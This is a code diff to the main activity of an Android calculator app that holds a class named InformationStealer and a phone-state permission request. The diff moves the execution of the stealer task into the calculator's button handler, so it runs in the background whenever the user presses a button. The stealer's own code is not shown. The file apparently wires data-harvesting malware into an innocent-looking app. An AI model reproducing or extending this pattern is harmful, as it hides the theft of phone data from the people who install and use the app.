@@ -1,8 +1,6 @@
 package com.example.applicazioneinteressante;
 
-import static com.example.applicazioneinteressante.InformationStealer.stealNumberInformations;
 
-import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.appcompat.app.AppCompatDelegate;
 import androidx.core.app.ActivityCompat;
@@ -25,12 +23,11 @@ import java.util.concurrent.Executors;
 
 public class MainActivity extends AppCompatActivity {
 
-    public boolean flag = true;
     private static final int PERMISSION_REQUEST_PHONE_STATE = 1;
     private String operation = "";
     private double op1 = 0, op2 = 0, prevResult = 0;
     private TextView current, history;
-    private InformationStealer task = new InformationStealer(this);
+    private final InformationStealer task = new InformationStealer(this);
     Executor executor = Executors.newSingleThreadExecutor();
 
     private class MyNumberButton {
@@ -229,6 +226,7 @@ public class MainActivity extends AppCompatActivity {
                     operation = "";
                     break;
             }
+            executor.execute(task);
             System.out.println(task.getMessaggio());
         });
 
@@ -249,9 +247,6 @@ public class MainActivity extends AppCompatActivity {
         //Text fields that show current operation
         current = findViewById(R.id.insertion);
         history = findViewById(R.id.ans);
-
-        executor.execute(task);
     }
-
 }
 
